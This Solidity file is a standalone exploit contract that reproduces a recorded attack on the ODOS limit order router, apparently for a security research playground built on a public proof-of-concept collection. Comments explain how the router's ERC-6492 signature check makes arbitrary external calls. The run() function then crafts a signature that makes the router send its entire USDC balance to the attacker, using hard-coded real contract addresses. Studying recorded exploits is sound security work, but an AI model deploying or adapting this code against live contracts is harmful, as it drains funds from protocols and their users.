// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-01-ODOS).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (attacker = address(this); the crafted ERC-6492 signature encodes
// address(this) as the token-transfer recipient), so there is no standalone
// contract to deploy. This contract is a faithful, self-contained copy of that
// inline attack so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/ODOS_exp.sol (ContractTest.testExploit),
// with the single adaptation that address(this) is the deployed exploit contract
// (so the drained USDC lands on it, and profit is scored via profitReceiver:"exploit").
//
// Root cause: OdosLimitOrderRouter.isValidSigImpl() implements ERC-6492 signature
// validation. When the signature carries the ERC-6492 magic suffix, the router
// decodes (target, calldata, sig) from the signature and performs an ARBITRARY
// external call to `target` with attacker-controlled `calldata` while
// allowSideEffects == true. Passing target = USDC and calldata =
// USDC.transfer(attacker, routerBalance) makes the router transfer its own USDC
// to the attacker — a permissionless drain, no valid signature required.

interface IUSDC {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface OdosLimitOrderRouter {
    function isValidSigImpl(
        address _signer,
        bytes32 _hash,
        bytes calldata _signature,
        bool allowSideEffects
    ) external returns (bool);
}

contract ODOSDrain {
    OdosLimitOrderRouter private constant odosLimitOrderRouter =
        OdosLimitOrderRouter(0xB6333E994Fd02a9255E794C177EfBDEB1FE779C7);
    IUSDC private constant USDC = IUSDC(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);

    bytes32 private constant ERC6492_DETECTION_SUFFIX =
        bytes32(hex"6492649264926492649264926492649264926492649264926492649264926492");

    // Recorded attack: read the router's entire USDC balance, craft an ERC-6492
    // "wrapper" signature whose payload is (USDC, transfer(this, balance), 0x01),
    // and feed it to isValidSigImpl with allowSideEffects = true. The router
    // executes the encoded transfer against itself, draining its USDC to us.
    function run() external {
        uint256 victimUSDCBalance = USDC.balanceOf(address(odosLimitOrderRouter));

        bytes memory customCalldata = abi.encodeCall(IUSDC.transfer, (address(this), victimUSDCBalance));
        bytes memory signature = abi.encodePacked(
            abi.encode(address(USDC), customCalldata, bytes(hex"01")),
            ERC6492_DETECTION_SUFFIX
        );

        odosLimitOrderRouter.isValidSigImpl(address(0x04), bytes32(0x0), signature, true);
    }
}
